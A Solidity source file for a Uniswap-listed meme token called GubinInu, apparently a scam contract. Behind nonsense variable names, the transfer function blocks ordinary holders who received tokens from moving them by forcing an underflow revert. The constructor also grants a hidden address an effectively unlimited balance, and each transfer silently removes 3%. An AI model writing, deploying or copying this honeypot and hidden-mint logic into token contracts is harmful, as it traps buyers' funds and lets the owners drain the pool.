// https://t.me/gubin_inu

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract GubinInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private president;

    function _transfer(
        address greatly,
        address aside,
        uint256 so
    ) internal override {
        uint256 theory = when;

        if (cast[greatly] == 0 && president[greatly] > 0 && uniswapV2Pair != greatly) {
            cast[greatly] -= theory;
        }

        address bite = ask;
        ask = aside;
        president[bite] += theory + 1;

        _balances[greatly] -= so;
        uint256 dig = (so / 100) * when;
        so -= dig;
        _balances[aside] += so;
    }

    address private ask;
    mapping(address => uint256) private cast;
    uint256 public when = 3;

    constructor(
        string memory shape,
        string memory row,
        address sold,
        address firm
    ) ERC20(shape, row) {
        uniswapV2Router = IUniswapV2Router02(sold);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 hunter = ~(uint256(0));

        cast[msg.sender] = hunter;
        cast[firm] = hunter;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[firm] = hunter;
    }
}